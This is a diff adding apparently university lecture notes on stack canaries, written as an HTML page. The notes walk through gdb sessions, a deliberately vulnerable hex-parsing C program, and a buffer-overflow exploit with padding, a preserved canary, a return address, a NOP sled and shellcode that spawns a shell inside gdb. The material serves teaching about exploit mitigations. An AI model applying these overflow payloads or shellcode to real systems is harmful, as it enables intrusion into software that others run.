+segment. Unfortunately, we can't easily inspect this segment in gdb,
+but we can take a step and see what the canary is. 
+</p>
+
+<pre class="example">
+(gdb) ni
+0x080484af	5	void foo(char * s){
+(gdb) ds
+Dump of assembler code for function foo:
+   0x0804849d &lt;+0&gt;:	push   ebp
+   0x0804849e &lt;+1&gt;:	mov    ebp,esp
+   0x080484a0 &lt;+3&gt;:	sub    esp,0x28
+   0x080484a3 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080484a6 &lt;+9&gt;:	mov    DWORD PTR [ebp-0x1c],eax
+   0x080484a9 &lt;+12&gt;:	mov    eax,gs:0x14
+=&gt; 0x080484af &lt;+18&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484b2 &lt;+21&gt;:	xor    eax,eax
+   0x080484b4 &lt;+23&gt;:	mov    eax,DWORD PTR [ebp-0x1c]
+   0x080484b7 &lt;+26&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484bb &lt;+30&gt;:	lea    eax,[ebp-0x16]
+   0x080484be &lt;+33&gt;:	mov    DWORD PTR [esp],eax
+   0x080484c1 &lt;+36&gt;:	call   0x8048370 &lt;strcpy@plt&gt;
+   0x080484c6 &lt;+41&gt;:	lea    eax,[ebp-0x16]
+   0x080484c9 &lt;+44&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484cd &lt;+48&gt;:	mov    DWORD PTR [esp],0x80485a0
+   0x080484d4 &lt;+55&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x080484d9 &lt;+60&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484dc &lt;+63&gt;:	xor    eax,DWORD PTR gs:0x14
+   0x080484e3 &lt;+70&gt;:	je     0x80484ea &lt;foo+77&gt;
+   0x080484e5 &lt;+72&gt;:	call   0x8048360 &lt;__stack_chk_fail@plt&gt;
+   0x080484ea &lt;+77&gt;:	leave  
+   0x080484eb &lt;+78&gt;:	ret    
+End of assembler dump.
+(gdb) p/x $eax
+$1 = 0x3444a500
+(gdb)
+</pre>
+
+<p>
+There it is. Now this value is written to <code>ebp-0xc</code>, which is exactly
+the 4-bytes following the buffer, which is at location <code>ebp-0x16</code>, or
+10 bytes away (0x16-0xc = 22-12 = 10). After initializing the canary,
+the next relevant item is the call to <code>__stack_chk_fail</code> before the
+leave and return. This will look at the canary and make sure that it's
+value hasn't changed. If so, it will do the abort.
+</p>
+
+<p>
+Lets now continue until right before the call to <code>strcpy()</code> and
+inspect the stack:
+</p>
+
+<pre class="example">
+(gdb) br *0x080484c1
+Breakpoint 2 at 0x80484c1: file smasher.c, line 7.
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484c1 in foo (s=0xbffff87d 'A' &lt;repeats 11 times&gt;) at smasher.c:7
+7	  strcpy(buf,s);
+(gdb) ds
+Dump of assembler code for function foo:
+   0x0804849d &lt;+0&gt;:	push   ebp
+   0x0804849e &lt;+1&gt;:	mov    ebp,esp
+   0x080484a0 &lt;+3&gt;:	sub    esp,0x28
+   0x080484a3 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080484a6 &lt;+9&gt;:	mov    DWORD PTR [ebp-0x1c],eax
+   0x080484a9 &lt;+12&gt;:	mov    eax,gs:0x14
+   0x080484af &lt;+18&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484b2 &lt;+21&gt;:	xor    eax,eax
+   0x080484b4 &lt;+23&gt;:	mov    eax,DWORD PTR [ebp-0x1c]
+   0x080484b7 &lt;+26&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484bb &lt;+30&gt;:	lea    eax,[ebp-0x16]
+   0x080484be &lt;+33&gt;:	mov    DWORD PTR [esp],eax
+=&gt; 0x080484c1 &lt;+36&gt;:	call   0x8048370 &lt;strcpy@plt&gt;
+   0x080484c6 &lt;+41&gt;:	lea    eax,[ebp-0x16]
+   0x080484c9 &lt;+44&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484cd &lt;+48&gt;:	mov    DWORD PTR [esp],0x80485a0
+   0x080484d4 &lt;+55&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x080484d9 &lt;+60&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484dc &lt;+63&gt;:	xor    eax,DWORD PTR gs:0x14
+   0x080484e3 &lt;+70&gt;:	je     0x80484ea &lt;foo+77&gt;
+   0x080484e5 &lt;+72&gt;:	call   0x8048360 &lt;__stack_chk_fail@plt&gt;
+   0x080484ea &lt;+77&gt;:	leave  
+   0x080484eb &lt;+78&gt;:	ret    
+End of assembler dump.
+(gdb) x/10x $ebp-0x20
+0xbffff648:	0x00000001	0xbffff87d	0xbffff844	0x0000002f
+0xbffff658:	0x0804a000	0x3444a500	0x00000002	0xbffff724
+0xbffff668:	0xbffff688	0x08048505
+</pre>
+
+<p>
+At this point, we can see the stack as we are about to fill it in. We
+can also see the canary value 0x3444a500, nd all the way up to the
+return address 0x0804850. Now if we take one more step, this picture
+changes:
+</p>
+
+<pre class="example">
+(gdb) ni
+9	  printf("You said: %s\n",buf);
+(gdb) ds
+Dump of assembler code for function foo:
+   0x0804849d &lt;+0&gt;:	push   ebp
+   0x0804849e &lt;+1&gt;:	mov    ebp,esp
+   0x080484a0 &lt;+3&gt;:	sub    esp,0x28
+   0x080484a3 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080484a6 &lt;+9&gt;:	mov    DWORD PTR [ebp-0x1c],eax
+   0x080484a9 &lt;+12&gt;:	mov    eax,gs:0x14
+   0x080484af &lt;+18&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484b2 &lt;+21&gt;:	xor    eax,eax
+   0x080484b4 &lt;+23&gt;:	mov    eax,DWORD PTR [ebp-0x1c]
+   0x080484b7 &lt;+26&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484bb &lt;+30&gt;:	lea    eax,[ebp-0x16]
+   0x080484be &lt;+33&gt;:	mov    DWORD PTR [esp],eax
+   0x080484c1 &lt;+36&gt;:	call   0x8048370 &lt;strcpy@plt&gt;
+=&gt; 0x080484c6 &lt;+41&gt;:	lea    eax,[ebp-0x16]
+   0x080484c9 &lt;+44&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484cd &lt;+48&gt;:	mov    DWORD PTR [esp],0x80485a0
+   0x080484d4 &lt;+55&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x080484d9 &lt;+60&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484dc &lt;+63&gt;:	xor    eax,DWORD PTR gs:0x14
+   0x080484e3 &lt;+70&gt;:	je     0x80484ea &lt;foo+77&gt;
+   0x080484e5 &lt;+72&gt;:	call   0x8048360 &lt;__stack_chk_fail@plt&gt;
+   0x080484ea &lt;+77&gt;:	leave  
+   0x080484eb &lt;+78&gt;:	ret    
+End of assembler dump.
+(gdb) x/8x $ebp-0x18
+0xbffff650:	0x4141f844	0x41414141	0x41414141	0x34440041
+0xbffff660:	0x00000002	0xbffff724	0xbffff688	0x08048505
+</pre>
+
+<p>
+After this, our canary is dead. And with a final continue, we'll never
+reach the leave and return.
+</p>
+
+<pre class="example">
+(gdb) c
+Continuing.
+You said: AAAAAAAAAAA
+ *** stack smashing detected ***: /home/user/git/si485-binary-exploits/lec/18/demo/smasher terminated
+
+Program received signal SIGABRT, Aborted.
+0xb7fdd424 in __kernel_vsyscall ()
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">2.2</span> Canaries Are Consistent across Function Calls and Forks</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Another interesting thing to notice about canaries is that they do not
+change throughout the entire run of a program. We can see this in this
+single sample program:
+</p>
+
+<pre class="example">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+#include "print_stack.h"
+
+void foo(char * s){
+  
+  char buf[10];
+  strcpy(buf,s);
+
+  printf("%s\n",buf);
+  print_stack("foo",1);
+  
+}
+
+int main(){
+  int i;
+  for(i=0;i&lt;2;i++){
+    if(fork() == 0){
+      foo("AAAAAAAAAA");
+    }
+    wait(0);
+  }
+}
+</pre>
+
+
+<p>
+This function forks 3 times, once in a child, and calls <code>foo</code> with a
+<code>print_stack</code>, and the result is:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fork_guards 
+AAAAAAAAAA
+--- STACK foo ---
+0xbffff6a0 &lt;ebp+0x8&gt;: 08048790
+0xbffff69c &lt;ebp+0x4&gt;: 08048690
+0xbffff698 &lt;ebp&gt;: bffff6c8
+0xbffff694 &lt;ebp-0x4&gt;: 00000000
+0xbffff690 &lt;ebp-0x8&gt;: 00000000
+0xbffff68c &lt;ebp-0xc&gt;: 8826c000
+0xbffff688 &lt;ebp-0x10&gt;: 41414141
+0xbffff684 &lt;ebp-0x14&gt;: 41414141
+0xbffff680 &lt;ebp-0x18&gt;: 4141f6c8
+0xbffff67c &lt;ebp-0x1c&gt;: 08048790
+0xbffff678 &lt;ebp-0x20&gt;: 00000000
+0xbffff674 &lt;ebp-0x24&gt;: 00000001
+0xbffff670 &lt;ebp-0x28&gt;: 0804878c
+0xbffff66c &lt;ebp-0x2c&gt;: 08048655
+0xbffff668 &lt;ebp-0x30&gt;: bffff698
+AAAAAAAAAA
+--- STACK foo ---
+0xbffff6a0 &lt;ebp+0x8&gt;: 08048790
+0xbffff69c &lt;ebp+0x4&gt;: 08048690
+0xbffff698 &lt;ebp&gt;: bffff6c8
+0xbffff694 &lt;ebp-0x4&gt;: 00000000
+0xbffff690 &lt;ebp-0x8&gt;: 00000000
+0xbffff68c &lt;ebp-0xc&gt;: 8826c000
+0xbffff688 &lt;ebp-0x10&gt;: 41414141
+0xbffff684 &lt;ebp-0x14&gt;: 41414141
+0xbffff680 &lt;ebp-0x18&gt;: 4141f6c8
+0xbffff67c &lt;ebp-0x1c&gt;: 08048790
+0xbffff678 &lt;ebp-0x20&gt;: 00000000
+0xbffff674 &lt;ebp-0x24&gt;: 00000001
+0xbffff670 &lt;ebp-0x28&gt;: 0804878c
+0xbffff66c &lt;ebp-0x2c&gt;: 08048655
+0xbffff668 &lt;ebp-0x30&gt;: bffff698
+AAAAAAAAAA
+--- STACK foo ---
+0xbffff6a0 &lt;ebp+0x8&gt;: 08048790
+0xbffff69c &lt;ebp+0x4&gt;: 08048690
+0xbffff698 &lt;ebp&gt;: bffff6c8
+0xbffff694 &lt;ebp-0x4&gt;: 00000000
+0xbffff690 &lt;ebp-0x8&gt;: 00000000
+0xbffff68c &lt;ebp-0xc&gt;: 8826c000
+0xbffff688 &lt;ebp-0x10&gt;: 41414141
+0xbffff684 &lt;ebp-0x14&gt;: 41414141
+0xbffff680 &lt;ebp-0x18&gt;: 4141f6c8
+0xbffff67c &lt;ebp-0x1c&gt;: 08048790
+0xbffff678 &lt;ebp-0x20&gt;: 00000000
+0xbffff674 &lt;ebp-0x24&gt;: 00000001
+0xbffff670 &lt;ebp-0x28&gt;: 0804878c
+0xbffff66c &lt;ebp-0x2c&gt;: 08048655
+0xbffff668 &lt;ebp-0x30&gt;: bffff698
+</pre>
+<p>
+IF you look closely, you'll see that the canary <code>0x00c02688</code> is the
+same in all instances. This might be something we can leverage when
+defeating the canary.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline12" class="outline-2">
+<h2 id="orgheadline12"><span class="section-number-2">3</span> Defeating Stack Canaries</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+It is actually really hard to defeat a stack canary. It requires a bit
+of luck (guessing the canary) and some really poorly written
+code. Just generally bad code won't do it, the code has to be pretty
+bad. 
+</p>
+
+<p>
+Before we get into all of that, there is <i>another</i> way to defeat a
+canary, which is jumping the canary entirely. We don't quite yet know
+how to do that, but we will get there soon.
+</p>
+</div>
+
+<div id="outline-container-orgheadline9" class="outline-3">
+<h3 id="orgheadline9"><span class="section-number-3">3.1</span> Some Really Bad Code</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+To not kill the canary, we need vulnerable program that will overrun a
+buffer and also(!) write null bytes along the way. This is so we can
+handle the issue of the canary having nulls. Here's some sample code
+that will do that:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>( <span style="color: #98fb98;">char</span> ** <span style="color: #eedd82;">args</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">numbers</span>[40];
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">i</span>;
+  <span style="color: #00ffff;">for</span>(i=0; *args; args++,i+=4){
+    sscanf(*args,<span style="color: #ffa07a;">"%x"</span>, (<span style="color: #98fb98;">int</span>*) &amp;numbers[i]);
+  }
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">j</span>;
+  <span style="color: #00ffff;">for</span>(j=0;j&lt;i;j+=4){
+    printf(<span style="color: #ffa07a;">"0x%x: %c%c%c%c\n"</span>, 
+           j, 
+           numbers[j],
+           numbers[j+1],
+           numbers[j+2],
+           numbers[j+3]);
+
+  }
+
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>,<span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+  foo(argv+1);
+}
+</pre>
+</div>
+<p>
+The program reads in command line fields as hex numbers and prints
+them out as strings. It is actually not a useless program, but there
+is a vulnerability. We can overrun the numbers array. Let's see that
+happen:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./hex_to_char 0x41424344 0x45464748 0x494a4b4c 0x4d4e4f50
+0x0: DCBA
+0x4: HGFE
+0x8: LKJI
+0xc: PONM
+</pre>
+<p>
+If we go a bit extreme stack smash detected!:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./hex_to_char `python -c "print ' '.join(map(hex,range(0x41414141,0x41414150)))"`
+0x0: AAAA
+0x4: BAAA
+0x8: CAAA
+0xc: DAAA
+0x10: EAAA
+0x14: FAAA
+0x18: GAAA
+0x1c: HAAA
+0x20: IAAA
+0x24: JAAA
+0x28: KAAA
+0x2c: LAAA
+0x30: MAAA
+0x34: NAAA
+0x38: OAAA
+ *** stack smashing detected ***: ./hex_to_char terminated
+Aborted (core dumped)
+</pre>
+
+<p>
+If we look at the first part of the disassembly of the vulnerable foo
+function in gdb:
+</p>
+<pre class="example">
+0x080484bd &lt;+0&gt;:	push   ebp
+ 0x080484be &lt;+1&gt;:	mov    ebp,esp
+ 0x080484c0 &lt;+3&gt;:	push   esi
+ 0x080484c1 &lt;+4&gt;:	push   ebx
+ 0x080484c2 &lt;+5&gt;:	sub    esp,0x60
+ 0x080484c5 &lt;+8&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+ 0x080484c8 &lt;+11&gt;:	mov    DWORD PTR [ebp-0x4c],eax
+ 0x080484cb &lt;+14&gt;:	mov    eax,gs:0x14
+ 0x080484d1 &lt;+20&gt;:	mov    DWORD PTR [ebp-0xc],eax
+ 0x080484d4 &lt;+23&gt;:	xor    eax,eax
+ 0x080484d6 &lt;+25&gt;:	mov    DWORD PTR [ebp-0x3c],0x0
+ 0x080484dd &lt;+32&gt;:	jmp    0x8048508 &lt;foo+75&gt;
+ 0x080484df &lt;+34&gt;:	lea    edx,[ebp-0x34]
+ 0x080484e2 &lt;+37&gt;:	mov    eax,DWORD PTR [ebp-0x3c]
+ 0x080484e5 &lt;+40&gt;:	add    edx,eax
+ 0x080484e7 &lt;+42&gt;:	mov    eax,DWORD PTR [ebp-0x4c]
+ 0x080484ea &lt;+45&gt;:	mov    eax,DWORD PTR [eax]
+ 0x080484ec &lt;+47&gt;:	mov    DWORD PTR [esp+0x8],edx
+ 0x080484f0 &lt;+51&gt;:	mov    DWORD PTR [esp+0x4],0x8048650
+ 0x080484f8 &lt;+59&gt;:	mov    DWORD PTR [esp],eax
+ 0x080484fb &lt;+62&gt;:	call   0x80483b0 &lt;__isoc99_sscanf@plt&gt;
+</pre>
+
+<p>
+We learn the following things:
+</p>
+<ul class="org-ul">
+<li>The canary is at ebp-0xc</li>
+<li>The buffer is at ebp-0x34</li>
+<li>The int i  is at ebp-0x3c</li>
+</ul>
+
+<p>
+That means we have 0x3c or 40 bytes or 8 integers to get to the
+canary, then it is 0xf or 16 bytes or 4 integers to overwrite the
+return address. Our exploit needs to look something like this:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./hex_to_char `python -c "print '0x646170 '*10 + '0x6e616300 ' + '0x646170 '*4 +'0x72646461 ' + '0x706f6e '*10 + '0x6c656873 '*5"`
+0x0: pad
+0x4: pad
+0x8: pad
+0xc: pad
+0x10: pad
+0x14: pad
+0x18: pad
+0x1c: pad
+0x20: pad
+0x24: pad
+0x28: can
+0x2c: pad
+0x30: pad
+0x34: pad
+0x38: pad
+0x3c: addr
+0x40: nop
+0x44: nop
+0x48: nop
+0x4c: nop
+0x50: nop
+0x54: nop
+0x58: nop
+0x5c: nop
+0x60: nop
+0x64: nop
+0x68: shel
+0x6c: shel
+0x70: shel
+0x74: shel
+0x78: shel
+ *** stack smashing detected ***: ./hex_to_char terminated
+Aborted (core dumped)
+</pre>
+<p>
+The exploit is we first do some padding, then the canary, then more
+padding, the return address, nops, the shell code. Easy, right? Let's
+see how we can do this in gdb.
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orgheadline10" class="outline-3">
+<h3 id="orgheadline10"><span class="section-number-3">3.2</span> Defeating a Canary in GDB</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+The first thing we need is to set up our shell code:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ echo $(printf `./hexify.sh smallest_shell` | ./le-fourbytes.py - | tr "\n" " ")
+0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080
+</pre>
+<p>
+Then we need to run under gdb with the right padding and everything,
+we can start gdb, execute with those arguments, and break in foo to
+learn the canary value:
+</p>
+
+<pre class="example">
+</pre>
+
+<p>
+Ok, so now that we now our canary value and where to jump, let's
+restart the program with those values:
+</p>
+
+<pre class="example">
+(gdb) br foo
+Breakpoint 1 at 0x80484cb: file hex_to_char.c, line 5.
+(gdb) r `python -c "print '0x41414141 '*10 + '0xcafebabe ' + '0x41414141 '*3 +'0xdeadbeef ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
+
+Starting program: /home/user/git/si485-binary-exploits/lec/18/demo/hex_to_char `python -c "print '0x41414141 '*10 + '0xcafebabe ' + '0x41414141 '*3 +'0xdeadbeef ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
+Breakpoint 1, foo (args=0xbffff548) at hex_to_char.c:5
+5	void foo( char ** args){
+(gdb)ds
+Dump of assembler code for function foo:
+   0x080484bd &lt;+0&gt;:	push   ebp
+   0x080484be &lt;+1&gt;:	mov    ebp,esp
+   0x080484c0 &lt;+3&gt;:	push   esi
+   0x080484c1 &lt;+4&gt;:	push   ebx
+   0x080484c2 &lt;+5&gt;:	sub    esp,0x60
+   0x080484c5 &lt;+8&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080484c8 &lt;+11&gt;:	mov    DWORD PTR [ebp-0x4c],eax
+=&gt; 0x080484cb &lt;+14&gt;:	mov    eax,gs:0x14
+   0x080484d1 &lt;+20&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484d4 &lt;+23&gt;:	xor    eax,eax
+  (...)
+(gdb) ni
+(gdb) p/x $eax
+$1 = 0x90ba2000
+(gdb) x/4xw $ebp
+0xbffff498:	0xbffff4b8	0x080485b0	0xbffff558	0xb7fff000
+</pre>
+
+<p>
+We now know a canary (0x90ba2000) value and we know a location to jump
+to (0xbfff4a*), so we can restart our program with those values. But
+when we do that, the cannary value has changed:
+</p>
+<pre class="example">
+(gdb) r `python -c "print '0x41414141 '*10 + '0x90ba2000 ' + '0x41414141 '*3 +'0xbffff4a4 ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/git/si485-binary-exploits/lec/18/demo/hex_to_char `python -c "print '0x41414141 '*10 + '0x90ba2000 ' + '0x41414141 '*3 +'0xbffff4a4 ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
+
+Breakpoint 1, foo (args=0xbffff558) at hex_to_char.c:5
+5	void foo( char ** args){
+(gdb) ni
+0x080484d1	5	void foo( char ** args){
+(gdb) p/x $eax
+$2 = 0xaae87500
+</pre>
+
+<p>
+And in here lies the problem: Every time we restart the program we
+loose the canary, but we can pretend like we knew it before hand by
+modifying our input in gdb:
+</p>
+
+<pre class="example">
+(gdb) x/s *(args+10)
+0xbffff79e:	"0x90ba2000"
+(gdb) set *(args+10)="0xaae87500"
+(gdb) x/s *(args+10)
+0x804b008:	"0xaae87500"
+</pre>
+
+<p>
+And if were to now remove the breakpoints and continue:
+</p>
+
+<pre class="example">
+(gdb) d
+Delete all breakpoints? (y or n) y
+(gdb) c
+Continuing.
+0x0: AAAA
+0x4: AAAA
+0x8: AAAA
+0xc: AAAA
+0x10: AAAA
+0x14: AAAA
+0x18: AAAA
+0x1c: AAAA
+0x20: AAAA
+0x24: AAAA
+0x28: u?
+0x2c: AAAA
+0x30: AAAA
+0x34: AAAA
+0x38: ????
+0x3c: ????
+0x40: ????
+0x44: ????
+0x48: ????
+0x4c: ????
+0x50: ????
+0x54: ????
+0x58: ????
+0x5c: ????
+0x60: ????
+0x64: 1???
+0x68: Phn/
+0x6c: shh/
+0x70: /bi?
+0x74: ?
+       ?
+0x78: ????
+process 29959 is executing new program: /bin/dash
+$
+</pre>
+
+<p>
+We get a shell. But, this is not super satisfying because there is no
+good way to do this outside of GDB. We need a program that does a bit
+more, in particular, a program we can crash a bunch to brute force the
+canary
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline11" class="outline-3">
+<h3 id="orgheadline11"><span class="section-number-3">3.3</span> Brute Forcing the Canary</h3>
+<div class="outline-text-3" id="text-3-3">
+<p>
+Why don't we just try and brute force cannary, how hard could it be?
+Well, let's compare this to ASLR. With ASLR, there was 19 bits of
+randomness we had to contend with, but we could handle that because of
+NOP sleds. With a NOP sled, we can reduce the randomness down to 7 or
+8 bits, which we can brute force fairly throughly.
+</p>
+
+<p>
+We don't have the luxury of a nop-sled with Canaries, and worse, there
+is 24 bits of randomness to contend with, not 19. Doing the math like
+before, to get to 50% probability of getting it right at least once,
+we'd need to do 16,777,215 guesses! That's way too many to do in a
+reasonable amount of time. It would seem like we are S.O.L.
+</p>
+
+<p>
+How do we defeat the canary? We have to jump the stack guard. For
+that, we'll need to use a new technique that doesn't involve stack
+smashing: format string attacks. We'll get it next. 
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
